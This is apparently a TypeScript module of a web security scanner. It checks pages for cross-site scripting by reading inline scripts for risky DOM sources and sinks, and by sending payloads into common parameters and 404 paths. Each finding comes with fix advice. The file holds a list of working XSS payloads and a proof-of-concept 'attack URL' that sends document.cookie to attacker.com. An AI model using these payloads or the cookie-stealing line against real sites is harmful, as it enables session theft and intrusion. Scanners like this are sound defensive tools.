import type { ScanContext, FindingInput } from "./types.js";

/**
 * Module 7: XSS Detection Engine
 * - Reflected XSS probing (parameter injection + reflection check)
 * - DOM-based XSS source/sink analysis in JavaScript
 * - Error page XSS (inject in 404 paths)
 * - Context-aware payload selection based on reflection context
 */

const REFLECTED_XSS_PAYLOADS = [
  { payload: '<script>alert(1)</script>',        marker: '<script>alert(1)</script>',    context: 'html' },
  { payload: '"><img src=x onerror=alert(1)>',   marker: 'onerror=alert(1)',             context: 'attribute' },
  { payload: "'-alert(1)-'",                      marker: "'-alert(1)-'",                 context: 'js-string' },
  { payload: '{{7*7}}',                            marker: '49',                           context: 'ssti' },
  { payload: '${7*7}',                             marker: '49',                           context: 'template-literal' },
  { payload: 'javascript:alert(1)//',              marker: 'javascript:alert(1)',          context: 'href' },
  { payload: 'redforge"><svg/onload=alert(1)>',   marker: 'svg/onload=alert(1)',          context: 'svg' },
];

const DOM_XSS_SOURCES = [
  /document\.location/g, /document\.URL/g, /document\.referrer/g,
  /window\.location\.hash/g, /window\.location\.search/g, /window\.location\.href/g,
  /location\.hash/g, /location\.search/g, /document\.cookie/g,
  /window\.name/g, /postMessage/g,
];

const DOM_XSS_SINKS = [
  /\.innerHTML\s*=/g, /\.outerHTML\s*=/g, /document\.write\s*\(/g,
  /document\.writeln\s*\(/g, /eval\s*\(/g, /setTimeout\s*\(\s*[^,)]*\+/g,
  /setInterval\s*\(\s*[^,)]*\+/g, /new\s+Function\s*\(/g,
  /\.insertAdjacentHTML\s*\(/g, /\.srcdoc\s*=/g,
  /jQuery\s*\(\s*[^)]*\+/g, /\$\s*\(\s*[^)]*\+/g,
  /v-html\s*=/g, /dangerouslySetInnerHTML/g,
];

const COMMON_XSS_PARAMS = [
  'q', 'search', 'query', 'keyword', 's', 'term', 'name', 'username',
  'email', 'url', 'redirect', 'next', 'return', 'callback', 'msg',
  'message', 'error', 'err', 'text', 'title', 'content', 'comment',
  'value', 'input', 'data', 'id', 'ref', 'page', 'lang',
];

async function probeReflectedXSS(
  ctx: ScanContext,
  targetEndpoint: string,
  param: string,
): Promise<FindingInput | null> {
  for (const { payload, marker, context } of REFLECTED_XSS_PAYLOADS.slice(0, 4)) {
    const probeUrl = `${targetEndpoint}${targetEndpoint.includes('?') ? '&' : '?'}${param}=${encodeURIComponent(payload)}`;
    const resp = await ctx.safeFetch(probeUrl, { timeoutMs: 6000 });
    if (!resp) continue;

    let body = '';
    try { body = await resp.text(); } catch { continue; }

    if (body.includes(marker)) {
      // Verify it's not just inside a <script> string or comment
      const lowerBody = body.toLowerCase();
      const markerIdx = lowerBody.indexOf(marker.toLowerCase());
      if (markerIdx === -1) continue;

      // Extract surrounding context (100 chars)
      const surrounding = body.slice(Math.max(0, markerIdx - 60), markerIdx + marker.length + 60);

      return {
        title: `Reflected XSS via ${param} parameter (${context} context)`,
        description: `Injecting "${payload}" into the "${param}" parameter at ${targetEndpoint} reflects the payload unescaped in the HTTP response body. This confirms a reflected Cross-Site Scripting (XSS) vulnerability that allows attackers to execute arbitrary JavaScript in victims' browsers by crafting a malicious URL.`,
        endpoint: probeUrl,
        severity: "HIGH",
        cvss: "8.1",
        cwe: "CWE-79",
        owasp: "A03",
        confidence: 0.9,
        evidence: surrounding.slice(0, 300),
        tags: ["xss", "reflected", `param:${param}`, `context:${context}`],
        pocCode: `# Reflected XSS PoC:\ncurl -s "${probeUrl}"\n# Look for unescaped: ${marker}\n\n# Attack URL (send to victim):\n# ${probeUrl.replace('alert(1)', 'fetch("https://attacker.com/steal?c="+document.cookie)')}`,
        fixPatch: `// Escape output based on context:\n// HTML context: use HTML entity encoding\nconst escaped = input.replace(/[&<>"']/g, c => ({\n  '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;'\n})[c] || c);\n\n// Use a template engine with auto-escaping (EJS, Handlebars, React JSX)`,
        fixExplanation: "Implement context-aware output encoding for all dynamic content. Use Content-Security-Policy to block inline script execution as defense-in-depth. Never insert user input into innerHTML or document.write().",
      };
    }
  }
  return null;
}

export async function runXSSDetectionModule(ctx: ScanContext): Promise<FindingInput[]> {
  const findings: FindingInput[] = [];
  const { targetUrl, bodyText, reachable, scanMode, addLog } = ctx;

  await addLog("INFO", "[Module 7] XSS detection engine — reflected probing + DOM sink analysis...");

  if (!reachable) {
    await addLog("WARN", "[Module 7] Target unreachable — skipping XSS analysis");
    return findings;
  }

  // Phase 1: DOM-based XSS source/sink analysis in page scripts
  if (bodyText) {
    const inlineScripts: string[] = [];
    const scriptRegex = /<script[^>]*>([\s\S]*?)<\/script>/gi;
    let scriptMatch;
    while ((scriptMatch = scriptRegex.exec(bodyText)) !== null) {
      if (scriptMatch[1]?.trim()) inlineScripts.push(scriptMatch[1]);
    }

    // Also fetch external JS bundles from same origin
    const scriptSrcPattern = /<script[^>]+src=["']([^"']+)["'][^>]*>/gi;
    let srcMatch;
    const bundleUrls: string[] = [];
    while ((srcMatch = scriptSrcPattern.exec(bodyText)) !== null) {
      const src = srcMatch[1];
      if (!src.includes("cdn") && !src.includes("unpkg") && !src.includes("jsdelivr") && !src.includes("cdnjs")) {
        try { bundleUrls.push(new URL(src, targetUrl).toString()); } catch { /* ignore */ }
      }
    }

    for (const bundleUrl of bundleUrls.slice(0, 4)) {
      const bundleResp = await ctx.safeFetch(bundleUrl, { timeoutMs: 8000 });
      if (!bundleResp) continue;
      try {
        const bundleBody = await bundleResp.text();
        inlineScripts.push(bundleBody.slice(0, 150000));
      } catch { /* ignore */ }
    }

    const allJsCode = inlineScripts.join('\n');
    if (allJsCode.length > 0) {
      let sourcesFound: string[] = [];
      let sinksFound: string[] = [];

      for (const sourcePattern of DOM_XSS_SOURCES) {
        const matches = allJsCode.match(sourcePattern);
        if (matches) sourcesFound.push(...matches.map(m => m.trim()));
      }

      for (const sinkPattern of DOM_XSS_SINKS) {
        const matches = allJsCode.match(sinkPattern);
        if (matches) sinksFound.push(...matches.map(m => m.trim()));
      }

      sourcesFound = [...new Set(sourcesFound)].slice(0, 8);
      sinksFound = [...new Set(sinksFound)].slice(0, 8);

      if (sourcesFound.length > 0 && sinksFound.length > 0) {
        await addLog("ERROR", `⚠️  DOM XSS: ${sourcesFound.length} source(s) + ${sinksFound.length} sink(s) detected`);
        findings.push({
          title: `DOM-based XSS: ${sourcesFound.length} tainted sources flow into ${sinksFound.length} dangerous sinks`,
          description: `JavaScript code at ${targetUrl} contains DOM XSS sources (user-controllable data) and dangerous sinks (code execution points).\n\n**Sources found:** ${sourcesFound.join(', ')}\n**Sinks found:** ${sinksFound.join(', ')}\n\nIf data flows from any source to any sink without sanitization, an attacker can execute arbitrary JavaScript by manipulating URL fragments, query parameters, or referrer headers.`,
          endpoint: targetUrl,
          severity: "HIGH",
          cvss: "7.1",
          cwe: "CWE-79",
          owasp: "A03",
          confidence: 0.7,
          tags: ["xss", "dom-based", ...sourcesFound.map(s => `source:${s}`), ...sinksFound.map(s => `sink:${s}`)],
          pocCode: `# DOM XSS via location.hash:\n${targetUrl}#<img src=x onerror=alert(document.cookie)>\n\n# DOM XSS via query param:\n${targetUrl}?q=<script>alert(1)</script>\n\n# Monitor with browser DevTools: set breakpoints on ${sinksFound[0] || 'innerHTML'}`,
          fixExplanation: "Replace dangerous sinks:\n- innerHTML → textContent\n- document.write → DOM manipulation APIs\n- eval() → JSON.parse() for data\n\nUse DOMPurify.sanitize() before any innerHTML assignment. Implement Trusted Types CSP to block all sink usage without sanitization.",
        });
      } else if (sinksFound.length > 0) {
        await addLog("WARN", `Dangerous JS sinks found: ${sinksFound.join(', ')}`);
        findings.push({
          title: `Dangerous DOM sinks detected: ${sinksFound.slice(0, 3).join(', ')}`,
          description: `The JavaScript at ${targetUrl} uses ${sinksFound.length} dangerous DOM manipulation methods: ${sinksFound.join(', ')}. These sinks can be exploited for XSS if they process any user-controlled data.`,
          endpoint: targetUrl,
          severity: "MEDIUM",
          cvss: "5.4",
          cwe: "CWE-79",
          owasp: "A03",
          confidence: 0.5,
          tags: ["xss", "dom-sinks", ...sinksFound.map(s => `sink:${s}`)],
          fixExplanation: "Audit each sink usage to verify it doesn't process user-controlled data. Replace innerHTML with textContent where possible. Use DOMPurify for any HTML rendering from dynamic content.",
        });
      }
    }
  }

  // Phase 2: Reflected XSS probing (ACTIVE mode only)
  if (scanMode === "ACTIVE") {
    await addLog("INFO", "Probing for reflected XSS across common parameters...");

    // Extract existing params from URL
    const existingParams: string[] = [];
    try {
      const parsed = new URL(targetUrl);
      parsed.searchParams.forEach((_, key) => existingParams.push(key));
    } catch { /* ignore */ }

    const paramsToTest = [...new Set([...existingParams, ...COMMON_XSS_PARAMS.slice(0, 10)])];

    // Common search/query endpoints
    const endpoints = [
      targetUrl,
      `${targetUrl}/search`,
      `${targetUrl}/api/search`,
    ];

    let xssCount = 0;
    for (const endpoint of endpoints) {
      if (xssCount >= 3) break;
      for (const param of paramsToTest.slice(0, 6)) {
        const finding = await probeReflectedXSS(ctx, endpoint, param);
        if (finding) {
          findings.push(finding);
          xssCount++;
          break; // one per endpoint
        }
      }
    }

    // Error page XSS (inject payload in 404 path)
    const errorPayload = '"><img src=x onerror=alert(1)>';
    const errorUrl = `${targetUrl}/${encodeURIComponent(errorPayload)}`;
    const errorResp = await ctx.safeFetch(errorUrl, { timeoutMs: 6000 });
    if (errorResp) {
      let errorBody = '';
      try { errorBody = await errorResp.text(); } catch { errorBody = ''; }
      if (errorBody.includes('onerror=alert(1)')) {
        await addLog("ERROR", "⚠️  XSS in error page — 404 path reflected unescaped");
        findings.push({
          title: "Reflected XSS in error/404 page path",
          description: `The server reflects URL path segments unescaped in error pages. Navigating to ${errorUrl} renders the injected payload in the HTML, enabling XSS through crafted error URLs.`,
          endpoint: errorUrl,
          severity: "HIGH",
          cvss: "7.1",
          cwe: "CWE-79",
          owasp: "A03",
          confidence: 0.95,
          tags: ["xss", "reflected", "error-page"],
          pocCode: `# Error page XSS:\ncurl -s "${errorUrl}" | grep -i "onerror"`,
          fixExplanation: "HTML-encode all dynamic content in error pages, including the request path. Never reflect raw URL data in error responses.",
        });
      }
    }
  }

  await addLog("DEBUG", `[Module 7] XSS detection complete — ${findings.length} issue(s) found`);
  return findings;
}
